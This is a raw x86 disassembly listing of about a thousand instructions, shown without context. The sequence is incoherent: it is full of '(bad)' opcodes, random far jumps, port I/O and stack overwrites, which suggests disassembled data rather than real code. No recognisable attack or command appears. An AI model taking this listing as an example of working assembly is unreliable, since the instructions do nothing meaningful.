  41fd21:	lea    esp,[ebx+0x54]
  41fd24:	outs   dx,BYTE PTR ds:[esi]
  41fd25:	mov    ?,WORD PTR [edi]
  41fd27:	sub    DWORD PTR [edi],ecx
  41fd29:	add    bl,BYTE PTR [esp+0x35]
  41fd2d:	imul   edi,DWORD PTR [ecx+0x7c7f6343],0xffffffed
  41fd34:	push   esi
  41fd35:	gs gs mov ecx,0x5c5e31c
  41fd3c:	xor    esi,ebx
  41fd3e:	mov    ecx,0x60374cc5
  41fd43:	sbb    al,0x33
  41fd45:	mov    edx,0xabb2a936
  41fd4a:	mov    esi,0xa40b625
  41fd4f:	dec    edi
  41fd50:	test   BYTE PTR [ebx],ah
  41fd52:	daa    
  41fd53:	test   al,0x9d
  41fd55:	mov    bh,0x85
  41fd57:	cmp    eax,0xe1835f36
  41fd5c:	pop    ds
  41fd5d:	outs   dx,DWORD PTR ds:[esi]
  41fd5e:	adc    DWORD PTR [esi+eiz*1],0xffffffae
  41fd62:	leave  
  41fd63:	push   edx
  41fd64:	scas   al,BYTE PTR es:[edi]
  41fd65:	push   0xb93351a4
  41fd6a:	push   ecx
  41fd6b:	repnz loop 0x41fdb8
  41fd6e:	xor    eax,eax
  41fd70:	add    eax,0x69938abd
  41fd75:	mov    esp,0xe4307e67
  41fd7a:	mov    ebp,0x1661989a
  41fd7f:	mov    ds:0x9214e3b7,eax
  41fd84:	push   edx
  41fd85:	cmp    al,0x8e
  41fd87:	rol    dl,1
  41fd89:	mov    cl,0xe2
  41fd8b:	int3   
  41fd8c:	arpl   sp,ax
  41fd8e:	sbb    edi,ebx
  41fd90:	cmc    
  41fd91:	or     eax,0x2976e697
  41fd96:	adc    BYTE PTR [ebx],dh
  41fd98:	push   ecx
  41fd99:	dec    eax
  41fd9a:	rcr    BYTE PTR [edx],0xa6
  41fd9d:	push   cs
  41fd9e:	shl    edi,1
  41fda0:	add    edi,DWORD PTR [eax+0x77b301bc]
  41fda6:	ss adc dh,cl
  41fda9:	cmp    eax,eax
  41fdab:	sub    esp,ecx
  41fdad:	stos   BYTE PTR es:[edi],al
  41fdae:	pop    ds
  41fdaf:	dec    ebx
  41fdb0:	lds    eax,FWORD PTR [edx-0x38]
  41fdb3:	mov    cl,0x4
  41fdb5:	scas   eax,DWORD PTR es:[edi]
  41fdb6:	jmp    0x41fd78
  41fdb8:	sbb    DWORD PTR [edx],0xb0844e01
  41fdbe:	or     al,BYTE PTR [eax+0x4bf3659b]
  41fdc4:	jns    0x41fe15
  41fdc6:	jmp    0xd444:0xb4b6dbf0
  41fdcd:	push   cs
  41fdce:	dec    ecx
  41fdcf:	jmp    0xce49:0x7b242d3b
  41fdd6:	mov    bl,0x3d
  41fdd8:	pop    esi
  41fdd9:	ja     0x41fdba
  41fddb:	xchg   ebx,eax
  41fddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fddd:	cwde   
  41fdde:	popa   
  41fddf:	bound  edi,QWORD PTR [ebx]
  41fde1:	mov    edx,0x6b33b81
  41fde6:	adc    BYTE PTR [esi-0x5c],ah
  41fde9:	leave  
  41fdea:	add    edx,DWORD PTR [ebx]
  41fdec:	mov    esp,edi
  41fdee:	add    al,0x69
  41fdf0:	xor    eax,0xd0c4a95d
  41fdf5:	sub    al,0xdd
  41fdf7:	inc    edi
  41fdf8:	(bad)  
  41fdf9:	cwde   
  41fdfa:	setbe  BYTE PTR [edi]
  41fdfd:	es test dh,cl
  41fe00:	test   esi,edi
  41fe02:	fimul  WORD PTR [ebx-0x200ae397]
  41fe08:	push   ecx
  41fe09:	cli    
  41fe0a:	mov    bh,0xea
  41fe0c:	ret    0x1cca
  41fe0f:	ret    
  41fe10:	fmul   DWORD PTR [edi+ebx*1+0x4df8d2b0]
  41fe17:	push   esp
  41fe18:	push   ss
  41fe19:	sub    eax,0x7800c511
  41fe1e:	(bad)
  41fe23:	out    0xa9,eax
  41fe25:	xlat   BYTE PTR ds:[ebx]
  41fe26:	pop    esi
  41fe27:	pop    ecx
  41fe28:	mov    ebp,0x7c89ec68
  41fe2d:	ret    
  41fe2e:	jg     0x41fe2c
  41fe30:	pop    ebx
  41fe31:	repz mov esi,0xfdbe5471
  41fe37:	int    0xce
  41fe39:	adc    al,0x70
  41fe3b:	mov    fs,eax
  41fe3d:	add    al,0xd0
  41fe3f:	imul   ebp,DWORD PTR [edx-0x765a6920],0xebfd6e46
  41fe49:	add    al,0x8c
  41fe4b:	sbb    DWORD PTR [edi+0x280f0a8c],0x73a92f39
  41fe55:	mov    esi,0x4a82d93b
  41fe5a:	cld    
  41fe5b:	out    0x14,al
  41fe5d:	hlt    
  41fe5e:	and    al,0xc4
  41fe60:	pop    edi
  41fe61:	shr    BYTE PTR [eax],0x94
  41fe64:	pop    edx
  41fe65:	sbb    dl,BYTE PTR [esi-0x1621160]
  41fe6b:	cmp    ah,BYTE PTR [edx]
  41fe6d:	inc    edi
  41fe6e:	xchg   ecx,eax
  41fe6f:	pop    es
  41fe70:	mov    al,ds:0x15eff8b0
  41fe75:	in     al,0xd1
  41fe77:	loop   0x41fe6d
  41fe79:	sbb    al,0xc3
  41fe7b:	js     0x41fe46
  41fe7d:	loop   0x41fea5
  41fe7f:	out    dx,eax
  41fe80:	call   0x1e25:0xc579b22f
  41fe87:	mov    ch,bh
  41fe89:	or     dl,BYTE PTR [esi+0x1630ba86]
  41fe8f:	or     dl,BYTE PTR [ebp+ebp*4-0xf]
  41fe93:	out    0x60,eax
  41fe95:	cli    
  41fe96:	loop   0x41fe50
  41fe98:	mov    al,ds:0xb9dcf92e
  41fe9d:	or     eax,0x4cd09444
  41fea2:	and    eax,0x21b15db5
  41fea7:	mov    esi,0xbdc61ed0
  41feac:	js     0x41febf
  41feae:	push   esi
  41feaf:	adc    DWORD PTR [ecx],0xffffffe6
  41feb2:	pop    ecx
  41feb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feb4:	retf   0x8756
  41feb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb8:	jbe    0x41fed6
  41feba:	and    eax,0xb247f001
  41febf:	mov    ah,BYTE PTR [ecx-0x5df0cdf8]
  41fec5:	(bad)
  41fec9:	mov    esp,0xc12b63c9
  41fece:	int3   
  41fecf:	xor    al,0xdf
  41fed1:	dec    DWORD PTR [esi+0x7774875e]
  41fed7:	xor    al,BYTE PTR [eax+ebx*4-0x23]
  41fedb:	ficom  DWORD PTR [edi]
  41fedd:	push   esi
  41fede:	or     ebp,eax
  41fee0:	mov    ebp,0x6dedb864
  41fee5:	lods   al,BYTE PTR ds:[esi]
  41fee6:	ficom  WORD PTR [edi-0x3]
  41fee9:	outs   dx,BYTE PTR ds:[esi]
  41feea:	je     0x41fea8
  41feec:	add    DWORD PTR [eax+0x4e2e0920],eax
  41fef2:	jne    0x41ff22
  41fef4:	mov    BYTE PTR [edi-0x32ccfa36],bh
  41fefa:	ret    0xe979
  41fefd:	xchg   edi,eax
  41fefe:	and    ch,dl
  41ff00:	dec    esi
  41ff01:	fldenv [eax-0x73]
  41ff04:	cmp    BYTE PTR [ebx],ah
  41ff06:	mov    ds:0xd85c30dc,al
  41ff0b:	cmp    ebp,DWORD PTR ds:0xab0add44
  41ff11:	test   BYTE PTR [edi+edi*4],al
  41ff14:	or     edx,esi
  41ff16:	cmp    al,0xb5
  41ff18:	fnstenv [ecx+0x398de9e8]
  41ff1e:	and    eax,0x901141fd
  41ff23:	rcl    DWORD PTR [eax-0x25],1
  41ff26:	push   cs
  41ff27:	retf   
  41ff28:	cmp    edx,DWORD PTR [ecx+0x62]
  41ff2b:	or     eax,0x3edcb4c5
  41ff30:	mov    eax,ds:0xbe8e4c42
  41ff35:	xor    ah,BYTE PTR [ebx]
  41ff37:	mov    ebx,0xcee50cbe
  41ff3c:	(bad)  
  41ff3d:	pop    ss
  41ff3e:	aas    
  41ff3f:	xor    BYTE PTR [eax+0x65e55d5f],al
  41ff45:	cvtps2pi mm6,QWORD PTR [ebp+0x1e]
  41ff49:	mov    esp,0x2e82b0f7
  41ff4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4f:	pusha  
  41ff50:	repz inc ebp
  41ff52:	dec    eax
  41ff53:	xor    BYTE PTR [eax+eiz*8],bh
  41ff56:	mov    dl,0x33
  41ff58:	fnstsw WORD PTR [esi+ebp*8+0x7a]
  41ff5c:	sub    eax,0x26478a3a
  41ff61:	mov    esi,0x83fac25d
  41ff66:	adc    al,0x73
  41ff68:	fisttp WORD PTR [edx+0x58]
  41ff6b:	cmc    
  41ff6c:	in     al,dx
  41ff6d:	cli    
  41ff6e:	bound  ebx,QWORD PTR [edi+ecx*4+0xa]
  41ff72:	mov    al,ds:0xfd7e8b0b
  41ff77:	jle    0x41ffba
  41ff79:	xchg   edx,eax
  41ff7a:	jge    0x41ff1b
  41ff7c:	mov    es,edx
  41ff7e:	and    bh,BYTE PTR [esi+0x72864a27]
  41ff84:	fistp  WORD PTR [edi]
  41ff86:	sti    
  41ff87:	adc    eax,0x5db32c1b
  41ff8c:	sub    edx,DWORD PTR [esi+ebp*8+0x2a13542b]
  41ff93:	popf   
  41ff94:	pusha  
  41ff95:	cli    
  41ff96:	ss mov ch,0xc
  41ff99:	fldcw  WORD PTR [edi+0x33c5e431]
  41ff9f:	cmc    
  41ffa0:	mov    eax,fs:0x6630251c
  41ffa6:	adc    BYTE PTR [edx-0x65858d01],0x1
  41ffad:	jns    0x41fff3
  41ffaf:	and    eax,0xc876499c
  41ffb4:	jo     0x41ffb6
  41ffb6:	mov    ss,WORD PTR [eax-0x62677947]
  41ffbc:	loop   0x41ffe2
  41ffbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffc0:	ins    DWORD PTR es:[edi],dx
  41ffc1:	dec    ebx
  41ffc2:	loopne 0x41ffac
  41ffc4:	ret    0xc76b
  41ffc7:	xor    BYTE PTR [edi-0x36],bh
  41ffca:	pop    es
  41ffcb:	(bad)  
  41ffcc:	push   eax
  41ffcd:	push   edx
  41ffce:	(bad)  
  41ffcf:	and    ebp,DWORD PTR [eax+0x3e]
  41ffd2:	xor    al,0x66
  41ffd4:	shl    esp,cl
  41ffd6:	daa    
  41ffd7:	lea    eax,[ebx]
  41ffd9:	or     cl,BYTE PTR [ebp-0x36414ebc]
  41ffdf:	xchg   esi,eax
  41ffe0:	add    DWORD PTR [ebp+0x5aa97e87],edi
  41ffe6:	(bad)  
  41ffe8:	arpl   WORD PTR [edx+ebx*2],cx
  41ffeb:	xchg   esp,esi
  41ffed:	mov    ebp,0x2b7c3143
  41fff2:	or     edi,DWORD PTR [edx]
  41fff4:	fadd   st,st(3)
  41fff6:	sbb    eax,DWORD PTR [esi]
  41fff8:	and    DWORD PTR [ebp-0x23c1be6f],esi
  41fffe:	push   edi
  41ffff:	push   cs
  420000:	pushf  
  420001:	adc    eax,0x8b4644c
  420006:	push   0xffffffe5
  420008:	outs   dx,DWORD PTR ds:[esi]
  420009:	mov    eax,ds:0x11aeab15
  42000e:	xor    DWORD PTR [esi],edx
  420010:	sbb    al,0x50
  420012:	and    al,0x20
  420014:	add    edx,ebp
  420016:	adc    al,0xef
  420018:	fsubrp st(1),st
  42001a:	iret   
  42001b:	hlt    
  42001c:	mov    al,0x72
  42001e:	dec    ecx
  42001f:	jo     0x41ffc5
  420021:	test   al,0x61
  420023:	call   0x8eea:0xec92d874
  42002a:	sub    ch,BYTE PTR [ebx]
  42002c:	dec    ebx
  42002d:	test   al,0x76
  42002f:	jp     0x41ffee
  420031:	pusha  
  420032:	gs call 0x9e3a:0x56048b6
  42003a:	int3   
  42003b:	sar    BYTE PTR [esi-0x42634484],1
  420041:	mov    esi,0x7d82e8e1
  420046:	push   eax
  420047:	xor    eax,0xdda10e18
  42004c:	dec    esp
  42004d:	sbb    DWORD PTR [eax+eiz*8+0x4d2dc0d1],ebp
  420054:	out    0x5,al
  420056:	leave  
  420057:	pushf  
  420058:	sub    edi,DWORD PTR [ecx]
  42005a:	setne  BYTE PTR [ebx+0x11]
  42005e:	or     ecx,ebx
  420060:	test   eax,0xccfece40
  420065:	ins    BYTE PTR es:[edi],dx
  420066:	or     bl,BYTE PTR [ebp-0x4f7c7233]
  42006c:	fild   DWORD PTR cs:[edx+0x4d911277]
  420073:	icebp  
  420074:	add    dl,BYTE PTR [ebx-0x27]
  420077:	lods   al,BYTE PTR ds:[esi]
  420078:	je     0x420056
  42007a:	icebp  
  42007b:	pop    es
  42007c:	pop    DWORD PTR [esi+0x6d963ff1]
  420082:	addr16 jmp 0xdc8f:0x6076ce41
  42008a:	pop    ds
  42008b:	int3   
  42008c:	mov    ebp,0xb9cc9452
  420091:	jne    0x42006f
  420093:	mov    bl,0x1e
  420095:	adc    al,0x2a
  420097:	mov    al,ds:0xb7793fce
  42009c:	or     dh,BYTE PTR [edx]
  42009e:	repnz fimul DWORD PTR [edi]
  4200a1:	push   es
  4200a2:	add    esp,DWORD PTR [edx]
  4200a4:	int3   
  4200a5:	inc    edx
  4200a6:	sub    al,BYTE PTR [ecx]
  4200a8:	aas    
  4200a9:	outs   dx,BYTE PTR ds:[esi]
  4200aa:	int3   
  4200ab:	test   DWORD PTR [esi+0x61bb2ea3],0x2b04b16e
  4200b5:	pop    ebx
  4200b6:	jle    0x4200ff
  4200b8:	arpl   WORD PTR [esi*1-0x1a939cc3],di
  4200bf:	imul   eax,ebp,0x1a
  4200c2:	mov    dh,0x10
  4200c4:	jmp    0xde0a:0x9b0cc202
  4200cb:	stos   DWORD PTR es:[edi],eax
  4200cc:	push   es
  4200cd:	xchg   edi,eax
  4200ce:	loopne 0x4200c2
  4200d0:	inc    esi
  4200d1:	stc    
  4200d2:	mov    ecx,DWORD PTR [esi-0x121d0034]
  4200d8:	daa    
  4200d9:	scas   al,BYTE PTR es:[edi]
  4200da:	xor    BYTE PTR [edi+0x3f],0xc4
  4200de:	pop    ebp
  4200df:	push   eax
  4200e0:	lds    ebp,FWORD PTR [ebx]
  4200e2:	jb     0x4200cd
  4200e4:	icebp  
  4200e5:	cmc    
  4200e6:	sbb    al,0x8e
  4200e8:	(bad)  
  4200e9:	mov    ebx,0xe2987be0
  4200ee:	(bad)  
  4200ef:	push   ecx
  4200f0:	jae    0x420076
  4200f2:	outs   dx,BYTE PTR ds:[esi]
  4200f3:	inc    ebp
  4200f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200f5:	aaa    
  4200f6:	mov    cs,WORD PTR [eax-0x165106d4]
  4200fc:	aaa    
  4200fd:	xor    DWORD PTR [ecx],ebx
  4200ff:	xchg   ebp,eax
  420100:	neg    BYTE PTR [ebp+0x1c]
  420103:	into   
  420104:	push   esp
  420105:	adc    cl,dh
  420107:	and    cl,ch
  420109:	fnstenv [eax]
  42010b:	jb     0x4200f9
  42010d:	sbb    eax,0x92cb01af
  420112:	add    DWORD PTR [eax+0x23],0x6c2f7eda
  420119:	and    BYTE PTR [esi-0xa],dl
  42011c:	jb     0x4200cc
  42011e:	jae    0x4200d7
  420120:	(bad)  
  420121:	cmp    al,BYTE PTR [ecx+eax*4-0xd]
  420125:	push   edi
  420126:	(bad)  
  420127:	or     ebp,edx
  420129:	sbb    ch,ah
  42012b:	shl    DWORD PTR [ebx+edx*2-0x702d9f1d],1
  420132:	dec    edx
  420133:	out    0x54,al
  420135:	out    0x87,eax
  420137:	and    dh,BYTE PTR [edi-0x36]
  42013a:	and    bl,BYTE PTR [eax]
  42013c:	pop    esp
  42013d:	call   0xf844e859
  420142:	scas   eax,DWORD PTR es:[edi]
  420143:	mov    dh,BYTE PTR [esi]
  420145:	(bad)  
  420147:	inc    ecx
  420148:	dec    ecx
  420149:	(bad)  
  42014a:	xor    al,BYTE PTR [edx+edi*1-0x69d96600]
  420151:	pushf  
  420152:	arpl   WORD PTR [edx+eiz*1+0xc63f2c2],cx
  420159:	aaa    
  42015a:	test   al,0xa9
  42015c:	inc    eax
  42015d:	or     BYTE PTR [eax-0x1b],al
  420160:	adc    eax,DWORD PTR [esi-0x5f]
  420163:	or     al,0xcc
  420165:	inc    ebp
  420166:	jae    0x420133
  420168:	rcl    DWORD PTR [esp+ebx*8],0x2f
  42016c:	xor    ebp,ebp
  42016e:	gs jecxz 0x4201c4
  420171:	rol    DWORD PTR [eax-0x2559ab5f],1
  420177:	out    dx,eax
  420178:	test   al,0x53
  42017a:	enter  0x25d0,0x13
  42017e:	bound  edx,QWORD PTR [edx]
  420180:	call   0xfa93:0xa18d2339
  420187:	inc    esp
  420188:	jb     0x4201d2
  42018a:	(bad)  
  42018b:	div    BYTE PTR [esi+0x34414fa8]
  420191:	cmc    
  420192:	lock fstp DWORD PTR [esi-0x38]
  420196:	push   es
  420197:	std    
  420198:	shl    BYTE PTR [ecx+0x5],1
  42019b:	pop    ss
  42019c:	xchg   DWORD PTR [edx+edx*1+0x1646f1e7],esi
  4201a3:	pop    ebp
  4201a4:	mov    dl,0x62
  4201a6:	mov    ah,0x15
  4201a8:	ret    0xddb1
  4201ab:	fisubr DWORD PTR [ecx-0x6af4dd83]
  4201b1:	mov    al,ds:0x4aa0f878
  4201b6:	mov    ch,0x1e
  4201b8:	arpl   WORD PTR [ebp+0x399262c4],di
  4201be:	adc    eax,DWORD PTR [ecx]
  4201c0:	icebp  
  4201c1:	xor    ebx,edi
  4201c3:	stc    
  4201c4:	dec    esi
  4201c5:	add    BYTE PTR [ebx-0x54],al
  4201c8:	sub    eax,DWORD PTR ds:0x6870aa9e
  4201ce:	push   0x55
  4201d0:	test   DWORD PTR [eax+0x4e],ebx
  4201d3:	mov    ebp,DWORD PTR [edx]
  4201d5:	cs jl  0x4201ae
  4201d8:	xor    al,0xa3
  4201da:	jl     0x42023b
  4201dc:	enter  0xfea9,0xf5
  4201e0:	(bad)  
  4201e1:	jge    0x42017b
  4201e3:	test   BYTE PTR [eax-0x2a6047a1],ch
  4201e9:	add    DWORD PTR [ebp+0x7bab6952],ebx
  4201ef:	push   edi
  4201f0:	inc    BYTE PTR [edi+0x5b]
  4201f3:	in     eax,0x4b
  4201f5:	adc    al,0x90
  4201f7:	xchg   ecx,eax
  4201f8:	jg     0x4201b5
  4201fa:	cmp    dl,BYTE PTR [ebx-0x25]
  4201fd:	neg    BYTE PTR [eax-0x21]
  420200:	ja     0x420264
  420202:	jmp    0xbb6bb369
  420207:	jmp    DWORD PTR [edi-0x724ee3af]
  42020d:	jb     0x4201cd
  42020f:	pop    ebx
  420210:	pop    ebp
  420211:	inc    esp
  420212:	cli    
  420213:	jl     0x420261
  420215:	mov    dh,0x39
  420217:	retf   
  420218:	int    0xbd
  42021a:	iret   
  42021b:	ret    
  42021c:	ds add al,0xdb
  42021f:	mov    al,0xc9
  420221:	mov    WORD PTR [eax+0x10a4d65b],ss
  420227:	lods   al,BYTE PTR ds:[esi]
  420228:	cmp    DWORD PTR [ebx+0x4583a945],esi
  42022e:	(bad)
  420231:	repnz pop ss
  420233:	jnp    0x42026c
  420235:	or     eax,0x97f9d1fb
  42023a:	xchg   ebp,eax
  42023b:	add    dh,dl
  42023d:	adc    ah,BYTE PTR [esi]
  42023f:	cs dec edx
  420241:	inc    ebp
  420242:	out    dx,al
  420243:	mov    ah,0xd7
  420245:	mov    esp,0x5beb5c68
  42024a:	xchg   ebp,eax
  42024b:	int    0x40
  42024d:	scas   eax,DWORD PTR es:[edi]
  42024e:	or     esi,DWORD PTR [ebp-0xbe24780]
  420254:	test   DWORD PTR [edi],0x61724893
  42025a:	add    edi,esp
  42025c:	pop    edi
  42025d:	outs   dx,BYTE PTR ds:[esi]
  42025e:	push   esp
  42025f:	xor    DWORD PTR [ebp+0x6a],esi
  420262:	add    eax,0x69577cf8
  420267:	inc    edi
  420268:	out    0xf3,al
  42026a:	mov    edi,0x22b1edff
  42026f:	loope  0x420208
  420271:	pop    ebp
  420272:	cwde   
  420273:	iret   
  420274:	mov    cl,0x7a
  420276:	xor    BYTE PTR [edi],ah
  420278:	out    dx,eax
  420279:	pusha  
  42027a:	jmp    0x85d3:0x29e1fc2a
  420281:	ret    0x7d5a
  420284:	push   esi
  420285:	or     ebp,DWORD PTR [edi]
  420287:	shl    BYTE PTR [eax+0x21],1
  42028a:	(bad)  
  42028b:	arpl   WORD PTR [esi],di
  42028d:	push   ss
  42028e:	xor    dl,cl
  420290:	jmp    0x4202c1
  420292:	mov    eax,ds:0xea6ed473
  420297:	jl     0x4202e3
  420299:	jno    0x4202ba
  42029b:	push   eax
  42029c:	test   BYTE PTR [ebx+0xa],ah
  42029f:	mov    ds:0x3e06931e,eax
  4202a4:	cmp    eax,0xd4399a62
  4202a9:	clc    
  4202aa:	sbb    ch,BYTE PTR [edi+0x6c]
  4202ad:	adc    eax,0x989207cc
  4202b2:	das    
  4202b3:	jmp    0xa80cbe04
  4202b8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202ba:	xchg   ecx,eax
  4202bb:	xchg   ebp,eax
  4202bc:	xor    eax,0xe6067d44
  4202c1:	jo     0x42026f
  4202c3:	mov    cl,BYTE PTR [ecx+0x2]
  4202c6:	jo     0x4202f7
  4202c8:	outs   dx,DWORD PTR ds:[esi]
  4202c9:	mov    al,0xe5
  4202cb:	xchg   BYTE PTR [edi-0x14],dh
  4202ce:	fimul  WORD PTR [eax]
  4202d0:	sbb    BYTE PTR [edi],dl
  4202d2:	imul   eax,DWORD PTR [eax-0x65],0xb5c0f933
  4202d9:	loope  0x420263
  4202db:	ja     0x4202e9
  4202dd:	fwait
  4202de:	adc    DWORD PTR ss:[eax+0x37],ebx
  4202e2:	out    dx,al
  4202e3:	mov    BYTE PTR [ebp-0x3e7d839],cl
  4202e9:	cmp    eax,DWORD PTR [edx+0x629eed5d]
  4202ef:	push   es
  4202f0:	repnz xor bh,BYTE PTR [edi-0x44]
  4202f4:	fsub   DWORD PTR [eax-0x35c5a5a1]
  4202fa:	stc    
  4202fb:	adc    edi,0x1c
  4202fe:	rcr    DWORD PTR [esi+0x72b2d856],0xbb
  420305:	jnp    0x4202f3
  420307:	or     dh,BYTE PTR [ebp+0x24]
  42030a:	or     BYTE PTR [edx+ecx*1],ah
  42030d:	jmp    0x4202ec
  42030f:	sub    al,BYTE PTR [ebp-0x49c5932a]
  420315:	(bad)  
  420316:	sbb    DWORD PTR [ebx+0x50],ecx
  420319:	cdq    
  42031a:	adc    DWORD PTR [eax-0x7d],ecx
  42031d:	inc    eax
  42031e:	jge    0x4202bb
  420320:	mov    ebp,0x52e4de54
  420325:	dec    edi
  420326:	xchg   DWORD PTR [edx],eax
  420328:	push   ss
  420329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42032a:	add    ecx,DWORD PTR [ebp+0x24]
  42032d:	cmp    eax,0x2f837590
  420332:	adc    eax,0x97f8f881
  420337:	outs   dx,DWORD PTR ds:[esi]
  420338:	cs ss test eax,0xb484b947
  42033f:	lahf   
  420340:	pop    edx
  420341:	or     DWORD PTR [ecx-0x6c607d74],edi
  420347:	mov    esi,0xe12f798c
  42034c:	mov    ds:0x366ea33c,eax
  420351:	jo     0x42031b
  420353:	test   DWORD PTR [ebx],ecx
  420355:	pop    ecx
  420356:	mov    eax,ds:0xfa3f24a8
  42035b:	push   cs
  42035c:	std    
  42035d:	cmp    al,0xa0
  42035f:	jecxz  0x4203be
  420361:	fisubr WORD PTR [ebp-0x8]
  420364:	repnz or esi,DWORD PTR es:[ecx+esi*8-0x5e]
  42036a:	in     al,0x85
  42036c:	xor    BYTE PTR [edx-0x20],dl
  42036f:	(bad)  
  420370:	call   FWORD PTR [edx+0x17540463]
  420376:	cmc    
  420377:	cmp    BYTE PTR [esi-0x34],cl
  42037a:	inc    edx
  42037b:	mov    ch,0x7c
  42037d:	leave  
  42037e:	test   BYTE PTR [esi-0x5ddf1348],ah
  420384:	and    eax,0xdf576044
  420389:	inc    ebx
  42038a:	mov    dl,BYTE PTR [ebx]
  42038c:	fild   QWORD PTR ss:[edi]
  42038f:	add    al,0xa0
  420391:	xor    al,0xd9
  420393:	out    dx,eax
  420394:	outs   dx,DWORD PTR ds:[esi]
  420395:	ret    0x1f52
  420398:	gs retf 
  42039a:	push   ecx
  42039b:	add    BYTE PTR [edx],0xe8
  42039e:	mov    DWORD PTR [ebx+0x7b],eax
  4203a1:	ror    BYTE PTR [edx],0xb6
  4203a4:	sti    
  4203a5:	mov    eax,0x7da0dcdb
  4203aa:	adc    esp,ecx
  4203ac:	cs xchg ebx,eax
  4203ae:	add    bh,ch
  4203b0:	call   0x97d4:0x837458ca
  4203b7:	push   ds
  4203b8:	cmp    DWORD PTR [ebx+0xc073dc9],esi
  4203be:	and    al,0x8f
  4203c0:	pop    es
  4203c1:	mov    ch,BYTE PTR [ebx+0x47]
  4203c4:	pop    esp
  4203c5:	jge    0x4203e5
  4203c7:	ss push esi
  4203c9:	loope  0x42040a
  4203cb:	or     bl,bh
  4203cd:	jo     0x420382
  4203cf:	rcl    DWORD PTR [edx-0x23],cl
  4203d2:	imul   BYTE PTR [ebx+0x323e499d]
  4203d8:	hlt    
  4203d9:	loope  0x42042c
  4203db:	and    al,0xde
  4203dd:	std    
  4203de:	shr    ecx,0xbc
  4203e1:	(bad)  
  4203e2:	loop   0x42044c
  4203e4:	xchg   ebx,eax
  4203e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203e6:	jge    0x420407
  4203e8:	test   al,0xf8
  4203ea:	sub    ebx,DWORD PTR [edx+ebp*4]
  4203ed:	dec    edx
  4203ee:	scas   al,BYTE PTR es:[edi]
  4203ef:	sbb    esi,ecx
  4203f1:	xchg   WORD PTR [ebx-0x6b37d604],cx
  4203f8:	inc    ebp
  4203f9:	push   ebx
  4203fa:	push   ebp
  4203fb:	into   
  4203fc:	addr16 inc ebp
  4203fe:	or     al,0x3b
  420400:	mov    ds:0x1438d1,eax
  420405:	add    DWORD PTR [ecx-0x82c64f9],edx
  42040b:	shl    BYTE PTR [edi],0xa6
  42040e:	lods   al,BYTE PTR ds:[esi]
  42040f:	sub    al,0x5e
  420411:	xchg   edx,eax
  420412:	into   
  420413:	adc    al,0x56
  420415:	inc    esp
  420416:	scas   eax,DWORD PTR es:[edi]
  420417:	mov    ds:0x342cda6,eax
  42041d:	test   DWORD PTR [ebx+0x11],0x65a370d4
  420424:	mov    dl,0xc4
  420426:	adc    BYTE PTR [ecx],0xe1
  420429:	fwait
  42042a:	inc    esp
  42042b:	adc    eax,0xe28e8fe6
  420430:	mov    ebx,0x12313325
  420435:	xchg   DWORD PTR [ebx+0x7b4d05d8],esp
  42043b:	xchg   edi,eax
  42043c:	pop    ss
  42043d:	adc    ecx,DWORD PTR [eax-0xd80cae5]
  420443:	fiadd  WORD PTR [eax+0x3561ad20]
  420449:	outs   dx,DWORD PTR ds:[esi]
  42044a:	xor    eax,0xbe76bac
  42044f:	daa    
  420450:	repz dec esp
  420452:	es jge 0x420405
  420455:	adc    cl,BYTE PTR [eax-0x309566aa]
  42045b:	xchg   esp,eax
  42045c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42045e:	(bad)  
  420460:	cmp    esi,DWORD PTR [edi+0x4e84b1e2]
  420466:	clc    
  420467:	or     esi,DWORD PTR [ebx-0x70f20b95]
  42046d:	out    0x6c,eax
  42046f:	jmp    FWORD PTR [esi-0x73]
  420472:	sar    dh,cl
  420474:	mov    bh,0x6d
  420476:	shl    BYTE PTR [edi],0x9e
  420479:	pop    ebx
  42047a:	rol    BYTE PTR [ebx-0x77b57cd5],cl
  420480:	adc    BYTE PTR [esi-0x23],cl
  420483:	call   0x5666:0x3f04da84
  42048a:	push   eax
  42048b:	xor    BYTE PTR [ecx],al
  42048d:	(bad)  
  42048e:	icebp  
  42048f:	aad    0x2e
  420491:	jae    0x4204d7
  420493:	arpl   WORD PTR [ebx+0x79],bp
  420496:	sub    esp,ebx
  420498:	std    
  420499:	loope  0x4204c2
  42049b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42049c:	or     eax,0x61334d4e
  4204a1:	lds    esp,FWORD PTR [eax]
  4204a3:	cmp    BYTE PTR [eax+0x5e8c86d0],bh
  4204a9:	hlt    
  4204aa:	je     0x4204d1
  4204ac:	(bad)  
  4204ad:	jle    0x4204c0
  4204af:	(bad)  
  4204b0:	outs   dx,BYTE PTR ds:[esi]
  4204b1:	mov    bl,0xe8
  4204b3:	push   ebx
  4204b4:	(bad)  
  4204b5:	mov    ah,0xb5
  4204b7:	mov    cl,BYTE PTR [ebx-0x163fda77]
  4204bd:	dec    ebp
  4204be:	push   ebp
  4204bf:	js     0x4204eb
  4204c1:	loope  0x42050d
  4204c3:	popa   
  4204c4:	push   esp
  4204c5:	sub    eax,0x6eecc76
  4204ca:	into   
  4204cb:	cmp    BYTE PTR [edx+0x3890c199],cl
  4204d1:	lods   eax,DWORD PTR ds:[esi]
  4204d2:	jmp    0x4204a8
  4204d4:	(bad)  
  4204d5:	mov    ?,WORD PTR [eax+0x46]
  4204d8:	cmp    al,BYTE PTR [edx+0x3e]
  4204db:	inc    edx
  4204dc:	pusha  
  4204dd:	sbb    edi,ebx
  4204df:	jecxz  0x42052b
  4204e1:	dec    ebp
  4204e2:	arpl   WORD PTR cs:[esp+edx*1+0x7df9de88],si
  4204ea:	call   0xda2b6c9e
  4204ef:	sbb    al,0x62
  4204f1:	push   eax
  4204f2:	pop    edi
  4204f3:	dec    ecx
  4204f4:	xchg   al,dh
  4204f6:	pusha  
  4204f7:	sbb    eax,0x17c6bbdd
  4204fc:	mov    ebx,0x4b0f54d3
  420501:	ja     0x42056c
  420503:	pop    ss
